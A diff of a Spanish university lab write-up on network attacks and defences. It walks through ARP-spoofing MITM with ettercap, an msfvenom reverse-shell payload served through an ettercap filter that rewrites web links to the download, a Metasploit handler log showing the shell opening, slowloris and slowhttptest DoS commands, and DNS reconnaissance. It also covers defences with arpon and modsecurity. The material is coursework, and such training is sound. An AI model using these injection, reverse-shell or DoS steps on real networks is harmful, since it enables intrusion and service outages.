@@ -5,11 +5,12 @@ Instale el ettercap y pruebe sus opciones básicas en línea de comando.
 ## APARTADO B
 Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados).
 1. Hacemos un MITM a la máquina de nuestro compañero:
-> `ettercap -T -q -i ens33 -M arp:remote //10.11.49.51/ //10.11.48.1/`
+> `ettercap -T -q -i ens33 -M arp:remote //10.11.49.55/ //10.11.48.1/`
+- Para generar trafico se puede usar el siguiente comando: `xdg-open http://www.edu4java.com/es/web/web30.html`.
 2. En otra terminal, hacemos un tcpdump para guardar el tráfico capturado en un fichero `pcap``:
 > `tcpdump -i ens33 -s 65535 -w compa.pcap`
-3. Desde nuestra máquina local, hacemos un `scp`` para obtener el fichero:
-> `scp lsi@10.11.48.50:/home/lsi/compa.pcap .`
+3. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero:
+> `scp lsi@10.11.49.54:/home/lsi/compa.pcap .`
 4. Ejecutamos Wireshark y abrimos el archivo compa.pcap para comenzar a analizar.
 
 ### APARTADOS COMPLEMENTARIOS
@@ -33,12 +34,7 @@ Obtenga la relación de las direcciones MAC de los equipos de su segmento.
 > `nmap -sP 10.11.48.0/23`
 
 ## APARTADO D
-> ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/
-
-**Script scanner:**
-> [!Warning]
-> No sabemos si es lo que piden
-
+Obtenga la relación de las direcciones IPv6 de su segmento.
 ```bash
 #!/bin/bash
 
@@ -61,91 +57,96 @@ nmap -6 -sn -iL ipv6_addresses.txt
 rm ipv4_addresses.txt
 rm ipv6_addresses.txt
 ```
-
-Obtenga la relación de las direcciones IPv6 de su segmento.
-> `ping6 -c2 -I ens33 ff02::1`
+> [!Warning]
+> Esta linea de comandos está obsoleta: `ping6 -c2 -I ens33 ff02::1`
 
 ## APARTADO E
+> [!Warning]
+> No estoy seguro de haber hecho este apartado, pero parece ser repetido.
+
 Obtenga el tráfico de entrada y salida legítimo de su interface de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.
+> `tcpdump -i ens33 -s 65535 -w my.pcap`
 
 ## APARTADO F
+> [!Warning]
+> No estoy seguro de haber hecho este apartado, pero parece ser repetido.
+
 Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.
 - Utilizamos el archivo `pcap` obtenido de la máquina de nuestro compañero.
 
 Se puede ver en *Statistics > HTTP > Requests*
 
 ## APARTADO G
-Instale metasploit. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
+Instale *Metasploit*. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
+1. Instalamos *Metasplot* siguiente [este tutorial](https://computingforgeeks.com/install-metasploit-framework-on-debian/).
+2. Creamos payload:
+> `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin`
 
+> :question: No entiendo que quieres decir a continuación:
 
-Creamos payload:
-> msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin
+3. Subimos el payload a donde sea para poder usarlo, como por ejemplo `tempfiles.org`
 
-Subimos el payload a donde sea para poder usarlo (ej tempfiles.org)
+4. Creamos `ett.filter`:
+> `nano ett.filter`
+```bash
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">");
+	msg("replaced href.\n");
+}
+```
+5. Configuramos:
+> `etterfilter ett.filter -o ig.ef`
 
-Creamos ett.filter
-> cat ett.filter 
->if (ip.proto == TCP && tcp.src == 80) {
->	replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">");
->	msg("replaced href.\n");
-> }
+6. Activamos el ip_forwarding
+> `echo 1 > /proc/sys/net/ipv4/ip_forward`
 
-Configuramos
-> etterfilter ett.filter -o ig.ef
+7. Encendemos el ettercap con el filtro:
+> `ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.55/ //10.11.48.1/`
 
-Activamos el ip_forwarding
-> echo 1 > /proc/sys/net/ipv4/ip_forward
+- Llegados a este punto, desde el cliente vemos la pagina y nos descargamos el virus:
+>  `lynx http://example.org`
 
-Encendemos el ettercap con el filtro
-> ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.106/ //10.11.48.1/
+1. Damos permisos de ejecucion 
+> `chmod +x payload.bin`
 
-Desde el cliente:
->  lynx http://example.org
-> (Vemos la pagina y nos descargamos el virus)
+2. Ejecutamos el virus
+> `./payload.bin`
 
-Damos permisos de ejecucion 
-> chmod +x payload.bin
+- Finalmente desde el atacante entramos en la consola de metasploit:
+> `msfconsole`
+```bash
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.11.48.50
+LHOST => 10.11.48.50
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 10.11.48.50:4444 
+[*] Sending stage (36 bytes) to 10.11.49.106
+[*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
+```
 
-Ejecutamos el virus
-> ./payload.bin
+Ahora estamos dentro del cliente desde el atacante.
+- Para salir podemos usar: `msf6 exploit(multi/handler) > exit`
 
-Desde el atacante:
-Entramos en la consola de metasploit
-> msfconsole
+> :question: No entiendo que quieres decir a continuación:
 
-    bash
-    msf6 > use multi/handler
-    [*] Using configured payload generic/shell_reverse_tcp
-    msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
-    payload => linux/x86/shell/reverse_tcp
-    msf6 exploit(multi/handler) > set LHOST 10.11.48.50
-    LHOST => 10.11.48.50
-    msf6 exploit(multi/handler) > set LPORT 4444
-    LPORT => 4444
-    msf6 exploit(multi/handler) > exploit
-    [*] Started reverse TCP handler on 10.11.48.50:4444 
-    [*] Sending stage (36 bytes) to 10.11.49.106
-    [*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
-
-
-Ahora estamos dentro del cliente desde el atacante
-
-Salimos cuando queramos
-> msf6 exploit(multi/handler) > exit
-
-En la máquina de la víctima simulamos una descarga del href introducido:
+Para comprobar si funciona, en la máquina de la víctima simulamos una descarga del href introducido.
 
 ## APARTADO H
 Haga un MITM en IPv6 y visualice la paquetería.
-> ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/
+> `ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/`
+- El resto funciona como el [segundo apartado](https://github.com/Meleagrista/legislacion-seguridad-informatica/edit/main/practica-2/p2-defensa.md#apartado-b).
 
 ## APARTADO I
 Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
 > `apt install arpon`
 - Para vaciar la tabla arp: `ip -s -s neigh flush all`
 > `nano /etc/arpon.conf`
-
-```
+```bash
 #
 # ArpON configuration file.
 #
@@ -173,12 +174,11 @@ Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting 
 - Puede ser increiblemente lento, es recomendable usarlo en ips individuales.
 
 ### CONTINUACIÓN DEL APARTADO
-### *Apartado incompleto.*
 1. Realice alguna de las pruebas de port scanning sobre IPv6.
-> `nmap -A -6 2002::a0b:3136::1`
+> `nmap -A -6 2002:a0b:3137::1`
 
 2. ¿Coinciden los servicios prestados por un sistema con los de IPv4?
-> ...
+> `nmap -A 10.11.49.54`
 
 ## APARTADO K
 Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.
@@ -191,41 +191,35 @@ Obtenga información "en tiempo real" sobre las conexiones de su máquina, así 
 > `vnstat -l -i ens33`
 
 ## APARTADO L
-> *Apartado incompleto.*
-
 Monitoremos nuestra infraestructura:
 
-### APARTADO M
+### 1. APARTADO M
 ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?
 ¿Y mediante un DoS de tipo reflective flooding attack?
 
-### APARTADO N
+### 2. APARTADO N
 Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).
 > `apt install apache2`
 
 > `curl https://www.alvarofreire.es/ > /var/www/html/index.html`
 
-1. Slowhttptest
-
+#### 1. Slowhttptest
 > `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.54 -x 24 -p 3`
 
-2. Apache benchmarking
-
+#### 2. Apache benchmarking
 > `ab -n 10000 -c 10000 http://10.11.49.55/`
 
-3. Slowloris Python
-
+#### 3. Slowloris Python
 > `git clone https://github.com/gkbrk/slowloris.git`
 
 > `cd slowloris`
 
 > `python3 slowloris.py 10.11.49.55 -s 500`
 
-4. Slowlori Perl
+#### 4. Slowlori Perl
 
-Crear archivo slowlorys.pl y copiar contenido de [aqui](https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl)
-
-> perl slowloris.pl -dns 10.11.49.55
+Crear archivo `slowlorys.pl` y copiar contenido de [aqui](https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl)
+> `perl slowloris.pl -dns 10.11.49.55`
 
 1. ¿Cómo podría proteger dicho servicio ante este tipo de ataque?
 > Con un firewall de aplicaciones web como modsecurity.
@@ -233,11 +227,11 @@ Crear archivo slowlorys.pl y copiar contenido de [aqui](https://github.com/GHubg
 > ...
 3. ¿Cómo podría tratar de saltarse dicha protección?
 > ...
-### APARTADO O
-Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?
 
-> [!Note]ç
-- Para ver la lista de modulos activos usar `apachectl -M`.
+### 3. APARTADO O
+Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?
+> [!Note]
+> Para ver la lista de modulos activos usar `apachectl -M`.
 
 > `apt install libapache2-mod-security2`
 
@@ -250,7 +244,7 @@ Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado an
 > `cat app`
 
 > `nano /etc/modsecurity/modsecurity.conf`
-```
+```bash
 SecRuleEngine On
 
 SecConnEngine On 
@@ -264,7 +258,7 @@ SecConnWriteStateLimit 10
 > `a2enmod evasive`
 
 > `nano /etc/apache2/mods-enabled/evasive.conf`
-```
+```bash
 <IfModule mod_evasive20.c>
     #DOSHashTableSize    3097
     DOSPageCount        1
@@ -284,46 +278,48 @@ SecConnWriteStateLimit 10
 
 > `dpkg -i libapache2-mod-qos_11.74-1+b1_amd64.deb`
 
-- Se puede modificar el `qos.conf` para aplicar las reglas.
+> [!Note]
+> Se puede modificar el `qos.conf` para aplicar las reglas.
 
-### OWASP ModSecurity Core Rule Set
+#### OWASP ModSecurity Core Rule Set
 The OWASP ModSecurity Core Rule Set (CRS) is a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls. The CRS aims to protect web applications from a wide range of attacks, including the OWASP Top Ten, with a minimum of false alerts. The CRS provides protection against many common attack categories, including SQL Injection, Cross Site Scripting, and Local File Inclusion.
 
 1. Elimina el conjunto de reglas actual que viene preempaquetado con ModSecurity ejecutando el siguiente comando:
-```bash
-rm -rf /usr/share/modsecurity-crs
-```
+> `rm -rf /usr/share/modsecurity-crs`
+
 2. Asegúrate de que git esté instalado:
-```bash
-apt install git
-```
+> `apt install git`
+
 3. Clona el repositorio de GitHub de OWASP-CRS en el directorio /usr/share/modsecurity-crs:
-```bash
-git clone https://github.com/coreruleset/coreruleset /usr/share/modsecurity-crs
-```
+> `git clone https://github.com/coreruleset/coreruleset /usr/share/modsecurity-crs`
+
 4. Renombra el archivo crs-setup.conf.example a crs-setup.conf:
-```bash
-mv /usr/share/modsecurity-crs/crs-setup.conf.example /usr/share/modsecurity-crs/crs-setup.conf
-```
-5. Renombra el archivo de reglas de exclusión de solicitudes predeterminado:
-```bash
-mv /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
-```
+> `mv /usr/share/modsecurity-crs/crs-setup.conf.example /usr/share/modsecurity-crs/crs-setup.conf`
+
+5. Renombra el archivo de reglas de exclusión de solicitudes predetermined:
+> `mv /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf`
+
 ## APARTADO P
 1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
 > `whois -h whois.ripe.net UDC`
-- Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.
+
+> [!Warning]
+> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.
 
 2. Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.
 > `apt install bind-utils`
 
 > `dig udc.es MX`
-- Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.
+
+> [!Warning]
+> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.
 
 3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?
 - No, tiene la transferencia de zona deshabilitada:
 > `dig axfr @zipi.udc.es udc.es.`
-- Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.
+
+> [!Warning]
+> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.
 
 4. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.
 > `nmap --script hostmap-crtsh.nse udc.es`
@@ -334,8 +330,9 @@ mv /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.
 > `whatweb www.usc.es`
 
 ## APARTADO Q
-> *Apartado repetido*
 Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.
+1. Para hacer OS fingerprinting: `nmap -O --osscan-guess`
+2. Para hacer port scanning: `nmap -sV`
 
 ## APARTADO R
 Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.
